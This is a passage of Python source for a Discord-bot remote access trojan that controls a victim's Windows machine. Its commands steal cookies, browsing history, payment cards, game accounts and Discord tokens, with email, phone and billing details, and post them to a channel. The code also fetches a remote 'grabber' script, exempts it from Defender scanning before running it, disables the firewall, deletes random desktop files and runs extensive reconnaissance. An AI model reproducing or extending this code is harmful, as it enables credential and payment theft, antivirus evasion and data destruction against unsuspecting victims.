    total = len(parts)
    for i in range(0, total, 5):
        batch = parts[i:i + 5]
        files = []
        for j, p in enumerate(batch):
            name = safe + (".txt" if total == 1 else "_p{}.txt".format(i + j + 1))
            files.append(discord.File(io.BytesIO(p), filename=name))
        await channel.send(files=files)
        await asyncio.sleep(0.6)

EMBED_BUDGET = 5600


def _parse_accounts(raw):
    if not raw:
        return []
    try:
        data = json.loads(raw)
    except Exception:
        data = None
    if isinstance(data, dict):
        return [data]
    if isinstance(data, list):
        return [a for a in data if isinstance(a, dict)]
    out = []
    for line in str(raw).splitlines():
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            obj = json.loads(line)
        except Exception:
            continue
        if isinstance(obj, dict):
            out.append(obj)
    return out


def _join_lines(items):
    return "\n".join([str(x) for x in items if x])


def _account_embed(a):
    e = create_embed("🔑 {}".format(a.get("user") or "unknown")[:250],
                     (a.get("source") or "-")[:4000], 0x5865F2)

    fields = []
    for label, key in (("👤 ID", "id"), ("📧 Email", "email"), ("📱 Phone", "phone"),
                       ("🔒 MFA", "mfa"), ("💎 Nitro", "nitro"), ("💳 Billing", "billing"),
                       ("✅ Verified", "verified")):
        value = a.get(key)
        if value in (None, "", "None"):
            continue
        fields.append((label, str(value), True))
    if a.get("token"):
        fields.append(("🔑 Token", "```{}```".format(a["token"]), False))
    if a.get("guilds"):
        fields.append(("🏠 HQ guilds", _join_lines(a["guilds"]), False))
    if a.get("gifts"):
        fields.append(("🎁 Gifts", _join_lines(a["gifts"]), False))

    used = len(e.title or "") + len(e.description or "")
    for name, value, inline in fields[:25]:
        value = value[:1000]
        if not value:
            continue
        room = EMBED_BUDGET - used - len(name) - 1
        if room <= 0:
            break
        if len(value) > room:
            value = value[:room].rstrip() + "…"
        e.add_field(name=name, value=value, inline=inline)
        used += len(name) + len(value)
    return e


async def _post_discord_embeds(dest, raw):
    accounts = _parse_accounts(raw)
    if not accounts:
        await dest.send(embed=create_embed("Discord", "No Discord account was found in the captured data.", 0x5865F2))
        return
    for start in range(0, min(len(accounts), 25), 5):
        embeds = [_account_embed(a) for a in accounts[start:start + 5]]
        await dest.send(embeds=embeds)
        await asyncio.sleep(1.0)

def _grab_path():
    path = resource_path(GRAB_SCRIPT)
    return path if os.path.exists(path) else None


async def _run_grab(job, timeout=900):
    path = _grab_path()
    if not path:
        return None
    try:
        out = await asyncio.wait_for(asyncio.to_thread(run_script_capture, path, job), timeout=timeout)
    except asyncio.TimeoutError:
        out = "[{}] timed out after {}s".format(job, timeout)
    return (out or "").strip()


async def _full_dump(dest):
    ts = int(time.time())
    history = ""
    for job in ("cookies", "history", "cards", "games", "discord"):
        out = await _run_grab(job)
        if out is None:
            return
        await asyncio.sleep(0.4)
        if job == "cookies":
            await _send_text_files(dest, "cookies_{}".format(ts), out or "No cookies were found.")
        elif job == "history":
            history = out
        elif job == "cards":
            await _send_text_files(dest, "history_cards_{}".format(ts),
                                   "===== HISTORY =====\n{}\n\n===== CARDS =====\n{}".format(
                                       history or "none", out or "none"))
        elif job == "games":
            await _send_text_files(dest, "accounts_{}".format(ts), out or "No accounts were found.")
        elif job == "discord":
            await _post_discord_embeds(dest, out)


@bot.command(aliases=["take"])
async def grab(ctx, mode: str = "all"):
    mode = (mode or "all").lower()
    if mode not in GRAB_MODES:
        await ctx.send(embed=create_embed("Grab", "Valid modes are: " + ", ".join("`{}`".format(m) for m in GRAB_MODES), 0xF1C40F))
        return

    if not _grab_path():
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(GRABBER_URL) as resp:
                    if resp.status != 200:
                        raise OSError("HTTP {}".format(resp.status))
                    with builtins.open(resource_path(GRAB_SCRIPT), "wb") as f:
                        f.write(await resp.read())
        except Exception as e:
            await ctx.send(embed=create_embed("Error", "The grabber script is missing and the download failed: {}".format(e), 0xFF0000))
            return

    await ctx.message.add_reaction("💰")
    dest = ctx.guild.get_channel(cfg_get(ctx.guild.id, "info")) or ctx.channel
    ts = int(time.time())

    if mode == "all":
        await _full_dump(dest)
    else:
        out = await _run_grab(mode)
        if out is None:
            await ctx.send(embed=create_embed("Error", "The grabber script could not be found.", 0xFF0000))
            return
        if mode == "discord":
            await _post_discord_embeds(dest, await _run_grab("discordjson") or "[]")
        elif mode == "history":
            await _send_text_files(dest, "history_{}".format(ts), out)
        elif mode == "cards":
            await _send_text_files(dest, "cards_{}".format(ts), out)
        elif mode == "games":
            await _send_text_files(dest, "accounts_{}".format(ts), out)
        elif mode == "vm":
            await dest.send(embed=create_embed("VMProtect", "The sandbox report is attached below.\n```{}```".format(out[:1900]), 0x3498DB))
        else:
            await _send_text_files(dest, "{}_{}".format(mode, ts), out)

    await ctx.send(embed=create_embed("Grab", "The collection finished and everything was posted in {}.".format(dest.mention), 0x00FF00))

@bot.command(aliases=["discord-diag", "ddiag"])
async def discord_diag(ctx):
    await ctx.message.add_reaction("🔎")
    out = await _run_grab("discorddiag", timeout=300)
    await _send_text_files(ctx.channel, "discord_diag_{}".format(int(time.time())), out or "Nothing was found.")

@bot.command(aliases=["leave-all"])
async def leave_all(ctx):
    msg = await ctx.send(embed=create_embed("⚠️ Confirm", "React with a check mark within fifteen seconds to leave every server.", 0xffa500))
    await msg.add_reaction("✅")

    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) == "✅" and reaction.message.id == msg.id

    try:
        await bot.wait_for("reaction_add", timeout=15.0, check=check)
    except asyncio.TimeoutError:
        await msg.edit(embed=create_embed("Cancelled", "The confirmation timed out and nothing was left.", 0xff0000))
        return
    left = 0
    for guild in list(bot.guilds):
        try:
            await guild.leave()
            left += 1
        except Exception:
            pass
    await ctx.send(embed=create_embed("👋 Left", "The bot left **{}** servers.".format(left), 0x0084ff))


@bot.command(aliases=["clean"])
async def clear(ctx):
    await ctx.send("`🚮` The channels are being cleaned, this takes a moment.")
    keep = {CHANNEL_NAMES["panel"], CHANNEL_NAMES["info"]}
    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.name not in keep:
                try:
                    await channel.purge(limit=1000)
                except Exception:
                    pass
    await ctx.send(embed=create_embed("🚮 Clean", "Every channel except the panel and the info channel was cleared.", 0x00ff00))

@bot.command()
async def accent(ctx, *, color: str = None):
    global ACCENT
    if not color:
        lines = [f"`{k}` — #{v:06x}" for k, v in ACCENT_PRESETS.items()]
        await ctx.send(embed=create_embed("🎨 Accent Colors", "These are the available names, or you can pass any hex colour.\n" + "\n".join(lines)))
        return
    c = color.lower().strip()
    if c in ACCENT_PRESETS:
        ACCENT = ACCENT_PRESETS[c]
    else:
        try:
            ACCENT = int(c.lstrip("#"), 16)
        except Exception:
            await ctx.send(embed=create_embed("Error", "That colour is not valid, use one of the names or a hex value like `#ff8800`.", 0xFF0000))
            return
    for g in bot.guilds:
        set_guild_value(g.id, "accent", ACCENT)
    await ctx.send(embed=create_embed("🎨 Accent", "Every new embed will use the colour `#{}`.".format(f"{ACCENT:06x}")))


@bot.command(aliases=["clicks"])
async def click(ctx, count: int = 1):
    count = max(1, min(count, 500))
    for _ in range(count):
        pyautogui.click()
        await asyncio.sleep(0.05)
    await ctx.send(embed=create_embed("🖱️ Click", "**{}** left clicks were sent at the current pointer position.".format(count), 0x00FF00))


@bot.command(aliases=["chaos"])
async def click_delete(ctx, count: int = 5, *, folder: str = None):
    target = resolve(folder) if folder else os.path.join(os.path.expanduser("~"), "Desktop")
    if not os.path.isdir(target):
        await ctx.send(embed=create_embed("Error", "That folder does not exist: `{}`.".format(target), 0xFF0000))
        return
    count = max(1, min(count, 200))
    deleted = []
    for _ in range(count):
        try:
            files = [f for f in os.listdir(target) if os.path.isfile(os.path.join(target, f))]
            if files:
                victim = random.choice(files)
                os.remove(os.path.join(target, victim))
                deleted.append(victim)
        except Exception:
            pass
        pyautogui.click()
        await asyncio.sleep(0.1)
    listing = "\n".join(f"🗑️ {d}" for d in deleted) or "Nothing was deleted."
    await ctx.send(embed=create_embed("🖱️ Click & Delete", "One click was sent per file and these were the casualties:\n```{}```".format(listing[:1900]), 0xFF0000))


@bot.command()
async def autoclick(ctx, state: str = None, interval: float = 0.5):
    global auto_click
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`, optionally followed by an interval.", 0xFFA500))
        return
    if state == "off":
        auto_click = False
        await ctx.send(embed=create_embed("🖱️ Autoclick", "The automatic clicking stopped.", 0xFF0000))
        return
    if auto_click:
        await ctx.send(embed=create_embed("🖱️ Autoclick", "The autoclicker is already running.", 0x3498DB))
        return

    def loop():
        while auto_click:
            try:
                pyautogui.click()
            except Exception:
                pass
            time.sleep(max(0.05, interval))

    auto_click = True
    threading.Thread(target=loop, daemon=True).start()
    await ctx.send(embed=create_embed("🖱️ Autoclick", "The machine will now click by itself every **{}** seconds.".format(interval), 0x00FF00))

@bot.command(aliases=["grabber"])
async def run_grabber(ctx, url: str = None, mode: str = "all"):
    url = url or GRABBER_URL
    if mode not in GRAB_MODES:
        mode = "all"

    temp = os.path.join(BASE_DIR, f"grabber_{uuid.uuid4().hex[:8]}.py")
    await ctx.message.add_reaction("💰")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    await ctx.send(embed=create_embed("Error", "The script returned HTTP {}.".format(resp.status), 0xFF0000))
                    return
                with builtins.open(temp, "wb") as f:
                    f.write(await resp.read())
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The script could not be downloaded: {}".format(e), 0xFF0000))
        return

    ps(f'Add-MpPreference -ExclusionPath "{temp}" -ErrorAction SilentlyContinue')

    try:
        out = await asyncio.wait_for(
            asyncio.to_thread(run_script_capture, temp, mode), timeout=600)
    except asyncio.TimeoutError:
        out = "[error] The script timed out after ten minutes."

    await ctx.send(embed=create_embed("Grabber", "The script `{}` was executed in mode **{}**.".format(os.path.basename(temp), mode), 0x00FF00))
    await send_long(ctx, out or "It ran but produced no output.")

    for _ in range(5):
        try:
            os.remove(temp)
            break
        except Exception:
            time.sleep(0.5)
    await ctx.send(embed=create_embed("Cleanup", "The temporary script was deleted from the disk.", 0x0084FF))

@bot.command(aliases=["systeminfo"])
async def sysinfo_raw(ctx):
    await ctx.message.add_reaction("🧾")
    raw = await asyncio.to_thread(exec_capture, "systeminfo")
    await send_long(ctx, raw)


@bot.command()
async def gpu(ctx):
    await send_long(ctx, ps("Get-CimInstance Win32_VideoController | Select-Object Name, DriverVersion, VideoProcessor | Format-List | Out-String").stdout)


@bot.command()
async def cpu(ctx):
    await send_long(ctx, ps("Get-CimInstance Win32_Processor | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed | Format-List | Out-String").stdout)


@bot.command(aliases=["mobo"])
async def motherboard(ctx):
    await send_long(ctx, ps("Get-CimInstance Win32_BaseBoard | Select-Object Manufacturer, Product, SerialNumber | Format-List | Out-String").stdout)


@bot.command()
async def bios(ctx):
    await send_long(ctx, ps("Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SMBIOSBIOSVersion, ReleaseDate, SerialNumber | Format-List | Out-String").stdout)


@bot.command()
async def disks(ctx):
    await send_long(ctx, ps("Get-CimInstance Win32_DiskDrive | Select-Object Model, Size, InterfaceType, SerialNumber | Format-List | Out-String").stdout)


@bot.command()
async def volumes(ctx):
    await send_long(ctx, ps("Get-Volume | Select-Object DriveLetter, FileSystemLabel, Size, SizeRemaining | Format-Table -AutoSize | Out-String").stdout)


@bot.command()
async def partition(ctx):
    await send_long(ctx, ps("Get-Partition | Select-Object DiskNumber, PartitionNumber, DriveLetter, Size | Format-Table -AutoSize | Out-String").stdout)


@bot.command()
async def temp(ctx):
    await send_long(ctx, ps("Get-CimInstance -Namespace root/WMI -ClassName MSAcpi_ThermalZoneTemperature | Select-Object InstanceName, CurrentTemperature | Format-Table -AutoSize | Out-String").stdout)


@bot.command()
async def uptime(ctx):
    delta = datetime.now() - datetime.fromtimestamp(psutil.boot_time())
    hours, rem = divmod(int(delta.total_seconds()), 3600)
    await ctx.send(embed=create_embed("⏱️ Uptime", "The machine has been running for **{} days, {} hours and {} minutes**.".format(delta.days, hours % 24, rem // 60), 0x3498db))


@bot.command(aliases=["time"])
async def sysclock(ctx):
    await ctx.send(embed=create_embed("🕒 System Clock", "The machine clock currently reads `{}`.".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")), 0x3498db))


@bot.command()
async def whoami(ctx):
    await send_long(ctx, cmd_run("whoami /all").stdout)


@bot.command(aliases=["envvars"])
async def env(ctx):
    await send_long(ctx, ps("Get-ChildItem Env: | Format-Table -AutoSize | Out-String").stdout)


@bot.command()
async def sessions(ctx):
    await send_long(ctx, cmd_run("query user").stdout)


@bot.command(aliases=["localusers"])
async def users(ctx):
    await send_long(ctx, ps("Get-LocalUser | Select-Object Name, Enabled, LastLogon | Format-Table -AutoSize | Out-String").stdout)


@bot.command(aliases=["hotfixes"])
async def hotfix(ctx):
    await send_long(ctx, ps("Get-HotFix | Select-Object HotFixID, Description, InstalledOn | Format-Table -AutoSize | Out-String").stdout)


@bot.command()
async def antivirus(ctx):
    await send_long(ctx, ps("Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName, productState | Format-Table -AutoSize | Out-String").stdout)


@bot.command()
async def drivers(ctx):
    await send_long(ctx, ps("Get-CimInstance Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion | Format-Table -AutoSize | Out-String").stdout[:6000])


@bot.command(aliases=["events"])
async def event_log(ctx):
    await send_long(ctx, ps("Get-EventLog -LogName System -Newest 20 | Select-Object TimeGenerated, EntryType, Source, Message | Format-List | Out-String").stdout[:6000])


@bot.command()
async def ping(ctx, host: str = "8.8.8.8"):
    await ctx.message.add_reaction("📡")
    await send_long(ctx, cmd_run(f"ping -n 4 {host}").stdout)


@bot.command()
async def tracert(ctx, host: str = "8.8.8.8"):
    await ctx.message.add_reaction("📡")
    await send_long(ctx, cmd_run(f"tracert -d -h 12 {host}").stdout)


@bot.command()
async def nslookup(ctx, host: str = "google.com"):
    await send_long(ctx, cmd_run(f"nslookup {host}").stdout)


@bot.command()
async def netstat(ctx):
    await send_long(ctx, cmd_run("netstat -ano").stdout[:7000])


@bot.command()
async def ports(ctx):
    await send_long(ctx, cmd_run("netstat -ano | findstr LISTENING").stdout)


@bot.command()
async def arp(ctx):
    await send_long(ctx, cmd_run("arp -a").stdout)


@bot.command()
async def route(ctx):
    await send_long(ctx, cmd_run("route print -4").stdout[:5000])


@bot.command(aliases=["flushdns"])
async def flush_dns(ctx):
    await ctx.send(embed=create_embed("🧹 DNS", "The DNS resolver cache was flushed, the next lookups will start from scratch.", 0x00ff00))


@bot.command(aliases=["renewip"])
async def renew_ip(ctx):
    await ctx.message.add_reaction("🔄")
    await send_long(ctx, cmd_run("ipconfig /release & ipconfig /renew").stdout)


@bot.command(aliases=["adapters"])
async def net_adapter(ctx):
    await send_long(ctx, ps("Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, LinkSpeed | Format-Table -AutoSize | Out-String").stdout)


@bot.command(aliases=["nearby-wifi"])
async def wifi_networks(ctx):
    await send_long(ctx, cmd_run("netsh wlan show networks mode=bssid").stdout[:6000])


@bot.command(aliases=["net-share"])
async def shares(ctx):
    await send_long(ctx, cmd_run("net share").stdout)


@bot.command(aliases=["public-ip"])
async def public_ip(ctx):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.ipify.org") as r:
                await ctx.send(embed=create_embed("🌍 Public IP", "The machine reaches the internet through the address below.\n```{}```".format(await r.text()), 0x3498db))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The public address could not be retrieved: {}".format(e), 0xff0000))


@bot.command()
async def cat(ctx, *, file: str):
    try:
        with builtins.open(resolve(file), "r", encoding="utf-8", errors="replace") as f:
            await send_long(ctx, f.read()[:8000] or "(The file is empty)")
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The file could not be read: {}".format(e), 0xff0000))


@bot.command()
async def mkdir(ctx, *, name: str):
    try:
        os.makedirs(resolve(name), exist_ok=True)
        await ctx.send(embed=create_embed("📁 Created", "The folder `{}` was created.".format(resolve(name)), 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The folder could not be created: {}".format(e), 0xff0000))


@bot.command(aliases=["write"])
async def mkfile(ctx, name: str, *, content: str = ""):
    try:
        with builtins.open(resolve(name), "w", encoding="utf-8") as f:
            f.write(content)
        await ctx.send(embed=create_embed("📝 Written", "The file `{}` was written with the supplied content.".format(resolve(name)), 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The file could not be written: {}".format(e), 0xff0000))


@bot.command()
async def move(ctx, src: str, *, dest: str):
    try:
        shutil.move(resolve(src), resolve(dest))
        await ctx.send(embed=create_embed("➡️ Moved", "`{}` was moved to `{}`.".format(src, dest), 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The path could not be moved: {}".format(e), 0xff0000))


@bot.command()
async def copy(ctx, src: str, *, dest: str):
    try:
        if os.path.isdir(resolve(src)):
            shutil.copytree(resolve(src), resolve(dest), dirs_exist_ok=True)
        else:
            shutil.copy2(resolve(src), resolve(dest))
        await ctx.send(embed=create_embed("📄 Copied", "`{}` was copied to `{}`.".format(src, dest), 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The path could not be copied: {}".format(e), 0xff0000))


@bot.command()
async def rename(ctx, src: str, *, dest: str):
    try:
        os.rename(resolve(src), resolve(dest))
        await ctx.send(embed=create_embed("🏷️ Renamed", "`{}` is now called `{}`.".format(src, dest), 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The path could not be renamed: {}".format(e), 0xff0000))


@bot.command()
async def size(ctx, *, path: str):
    p = resolve(path)
    try:
        if os.path.isfile(p):
            total = os.path.getsize(p)
        else:
            total = sum(os.path.getsize(os.path.join(dp, f)) for dp, _, fs in os.walk(p) for f in fs)
        await ctx.send(embed=create_embed("📏 Size", "`{}` takes up **{:.2f} MB** on the disk.".format(path, total / 1048576), 0x3498db))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The size could not be calculated: {}".format(e), 0xff0000))


@bot.command(aliases=["sha256"])
async def hash(ctx, *, file: str):
    try:
        h = hashlib.sha256()
        with builtins.open(resolve(file), "rb") as f:
            for block in iter(lambda: f.read(65536), b""):
                h.update(block)
        await ctx.send(embed=create_embed("🔑 SHA256", "The SHA256 digest of the file is below.\n```{}```".format(h.hexdigest()), 0x3498db))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The hash could not be computed: {}".format(e), 0xff0000))


@bot.command()
async def search(ctx, pattern: str, *, path: str = None):
    root = resolve(path or current_dir)
    hits = []
    try:
        for dp, _, fs in os.walk(root):
            for f in fs:
                if pattern.lower() in f.lower():
                    hits.append(os.path.join(dp, f))
            if len(hits) >= 80:
                break
        await ctx.send(embed=create_embed("🔎 Search", "These files match the pattern.\n```{}```".format(chr(10).join(hits) or "No matches"), 0x3498db))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The search failed: {}".format(e), 0xff0000))


@bot.command()
async def zip(ctx, src: str, dest: str = None):
    try:
        p = resolve(src).rstrip("\\/")
        out = resolve(dest or (os.path.basename(p) + ".zip"))
        shutil.make_archive(out[:-4], "zip", p)
        await ctx.send(embed=create_embed("🗜️ Zipped", "The archive was created at `{}`.".format(out), 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The archive could not be created: {}".format(e), 0xff0000))


@bot.command()
async def unzip(ctx, *, file: str):
    p = resolve(file)
    try:
        with zipfile.ZipFile(p) as z:
            z.extractall(os.path.dirname(p))
        await ctx.send(embed=create_embed("📦 Unzipped", "The archive was extracted into `{}`.".format(os.path.dirname(p)), 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The archive could not be extracted: {}".format(e), 0xff0000))


@bot.command()
async def run(ctx, *, file: str):
    subprocess.Popen(f'"{resolve(file)}"', shell=True)
    await ctx.send(embed=create_embed("▶️ Running", "`{}` was launched with its default handler.".format(file), 0x00ff00))


@bot.command()
async def recent(ctx):
    folder = os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Recent")
    try:
        files = sorted(glob.glob(os.path.join(folder, "*")), key=os.path.getmtime, reverse=True)[:40]
        await ctx.send(embed=create_embed("🕘 Recent Files", "These are the most recently opened files.\n```{}```".format(chr(10).join(os.path.basename(f) for f in files) or "None"), 0x3498db))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The recent list could not be read: {}".format(e), 0xff0000))


@bot.command(aliases=["usb-history"])
async def usb(ctx):
    await send_long(ctx, cmd_run('reg query HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR /s | findstr "Disk&Ven"').stdout)


@bot.command(aliases=["set-resolution"])
async def resolution(ctx, width: int = None, height: int = None):
    if not width or not height:
        await ctx.send(embed=create_embed("Error", "You have to give a width and a height, for example `.resolution 1920 1080`.", 0xffa500))
        return
    try:
        dm = win32api.EnumDisplaySettings(None, win32con.ENUM_CURRENT_SETTINGS)
        dm.PelsWidth, dm.PelsHeight = width, height
        win32api.ChangeDisplaySettings(dm, 0)
        await ctx.send(embed=create_embed("🖥️ Resolution", "The screen was forced to `{}x{}`.".format(width, height), 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The resolution could not be applied: {}".format(e), 0xff0000))


@bot.command(aliases=["darkmode"])
async def dark_mode(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
        return
    val = "0" if state == "on" else "1"
    for key in ("AppsUseLightTheme", "SystemUsesLightTheme"):
        cmd_run(f'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize" /v {key} /t REG_DWORD /d {val} /f')
    await ctx.send(embed=create_embed("🌗 Dark Mode", "The dark theme was enabled for the apps and the system." if state == "on" else "The light theme was restored for the apps and the system.", 0x00ff00))


@bot.command(aliases=["nightlight"])
async def night_light(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
        return
    out = ps(r'''
$p = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\CloudStore\Store\Cache\DefaultAccount\*windows.data.bluelightreduction.bluelightreductionstate*\Current'
$d = (Get-ItemProperty -Path $p -ErrorAction SilentlyContinue).Data
if (-not $d) { Write-Output 'unsupported'; exit }
if ($d[18] -eq 0x10) { $n = $d[0..17] + 0x15,0x02,0x01 + $d[18..($d.Length-1)] }
else { $n = $d[0..17] + 0x10 + $d[20..($d.Length-1)] }
Set-ItemProperty -Path $p -Name Data -Value $n
Stop-Process -Name StartMenuExperienceHost -Force -ErrorAction SilentlyContinue
Write-Output 'ok'
''').stdout
    await ctx.send(embed=create_embed("🌙 Night Light", "The blue light filter was toggled." if "ok" in out else "The blue light filter is not available on this machine.", 0x00ff00))


@bot.command(aliases=["invert"])
async def invert_colors(ctx):
    threading.Thread(target=flash_screen, args=("invert",), daemon=True).start()
    await ctx.send(embed=create_embed("🎨 Invert", "Every colour on the screen is inverted for ten seconds.", 0x0084ff))


@bot.command()
async def magnifier(ctx):
    subprocess.Popen("magnify.exe", shell=True)
    await ctx.send(embed=create_embed("🔍 Magnifier", "The Windows magnifier was opened.", 0x00ff00))


def _set_lock(name, state):
    vk = {"capslock": 0x14, "numlock": 0x90, "scrolllock": 0x91}[name]
    cur = ctypes.windll.user32.GetKeyState(vk) & 1
    if bool(cur) != state:
        ctypes.windll.user32.keybd_event(vk, 0x45, 0, 0)
        ctypes.windll.user32.keybd_event(vk, 0x45, 2, 0)


@bot.command()
async def capslock(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
        return
    _set_lock("capslock", state == "on")
    await ctx.send(embed=create_embed("⌨️ Caps Lock", "The Caps Lock key is now **{}**.".format(state.upper()), 0x00ff00))


@bot.command()
async def numlock(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
        return
    _set_lock("numlock", state == "on")
    await ctx.send(embed=create_embed("⌨️ Num Lock", "The Num Lock key is now **{}**.".format(state.upper()), 0x00ff00))


@bot.command()
async def scrolllock(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
        return
    _set_lock("scrolllock", state == "on")
    await ctx.send(embed=create_embed("⌨️ Scroll Lock", "The Scroll Lock key is now **{}**.".format(state.upper()), 0x00ff00))


@bot.command(aliases=["stickykeys"])
async def sticky_keys(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
        return
    cmd_run(f'reg add "HKCU\\Control Panel\\Accessibility\\StickyKeys" /v Flags /t REG_SZ /d {"511" if state == "on" else "58"} /f')
    await ctx.send(embed=create_embed("⌨️ Sticky Keys", "Sticky Keys was turned {}.".format(state.upper()), 0x00ff00))


@bot.command()
async def mouse_speed(ctx, speed: int = None):
    if speed is None:
        await ctx.send(embed=create_embed("Error", "You have to give a value between 1 and 20.", 0xffa500))
        return
    ctypes.windll.user32.SystemParametersInfoW(0x0071, 0, max(1, min(20, speed)), 3)
    await ctx.send(embed=create_embed("🖱️ Mouse Speed", "The pointer speed is now **{}** out of 20.".format(speed), 0x00ff00))


@bot.command()
async def swap_mouse(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
        return
    ctypes.windll.user32.SwapMouseButton(1 if state == "on" else 0)
    await ctx.send(embed=create_embed("🖱️ Swap Mouse", "The mouse buttons were swapped." if state == "on" else "The mouse buttons went back to normal.", 0x00ff00))


@bot.command()
async def hibernate(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
        return
    subprocess.run(["powercfg", "/hibernate", state], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    await ctx.send(embed=create_embed("💤 Hibernate", "Hibernation was turned {}.".format(state.upper()), 0x00ff00))


@bot.command()
async def fastboot(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
        return
    cmd_run(f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Power" /v HiberbootEnabled /t REG_DWORD /d {"1" if state == "on" else "0"} /f')
    await ctx.send(embed=create_embed("⚡ Fast Startup", "Fast startup was turned {}.".format(state.upper()), 0x00ff00))


@bot.command()
async def firewall(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
        return
    ps(f"Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled {'True' if state == 'on' else 'False'}")
    await ctx.send(embed=create_embed("🧱 Firewall", "The firewall was turned {} on every profile.".format(state.upper()), 0x00ff00))


@bot.command()
async def bitlocker(ctx):
    out = ps("Get-BitLockerVolume | Select-Object MountPoint, VolumeStatus, ProtectionStatus | Format-Table -AutoSize | Out-String").stdout
    if not out.strip():
        out = cmd_run("manage-bde -status").stdout
    await send_long(ctx, out)


@bot.command(aliases=["restore-point"])
async def restore_point(ctx):
    ps('Enable-ComputerRestore -Drive "$env:SystemDrive\\"; Checkpoint-Computer -Description "LessMi"')
    await ctx.send(embed=create_embed("♻️ Restore Point", "A System Restore checkpoint was created with the machine in its current state.", 0x00ff00))


@bot.command(aliases=["godmode"])
async def god_mode(ctx):
    path = os.path.join(os.path.expanduser("~"), "Desktop", "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}")
    try:
        os.makedirs(path, exist_ok=True)
        await ctx.send(embed=create_embed("🛠️ God Mode", "The God Mode folder was created on the desktop.", 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", "The folder could not be created: {}".format(e), 0xff0000))


@bot.command()
async def bluetooth(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "You have to say `on` or `off`.", 0xffa500))
        return
    verb = "Enable-PnpDevice" if state == "on" else "Disable-PnpDevice"
    ps(f"$d = Get-PnpDevice -Class Bluetooth -ErrorAction SilentlyContinue | Where-Object {{ $_.FriendlyName -notlike '*Enumerator*' }}; foreach ($x in $d) {{ {verb} -InstanceId $x.InstanceId -Confirm:$false -ErrorAction SilentlyContinue }}")
    await ctx.send(embed=create_embed("📶 Bluetooth", "The Bluetooth radios were turned {}.".format(state.upper()), 0x00ff00))


@bot.command(aliases=["eject"])
async def open_cd(ctx):
    ps("$d = Get-CimInstance Win32_LogicalDisk -Filter \"DriveType=5\" | Select-Object -First 1; if ($d) { (New-Object -com Shell.Application).NameSpace(17).ParseName($d.DeviceID).InvokeVerb('Eject') }")
    await ctx.send(embed=create_embed("💿 Drive", "The optical drive tray was ejected.", 0x0084ff))


@bot.command(aliases=["wallpaper-random"])
async def wallpaper_random(ctx):
    folder = os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "Web", "Wallpaper")
    files = glob.glob(os.path.join(folder, "**", "*.jpg"), recursive=True)
    if not files:
        await ctx.send(embed=create_embed("Error", "There are no stock wallpapers on this installation.", 0xff0000))
        return
    await set_wallpaper(ctx, source=random.choice(files))

@bot.command(aliases=["ss-wall", "wall-from-ss"])
async def wallpaper_from_ss(ctx):
    path = screenshot_all()
    if not path:
        await ctx.send(embed=create_embed("Error", "The screenshot could not be taken.", 0xff0000))
        return
    ps("Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{"
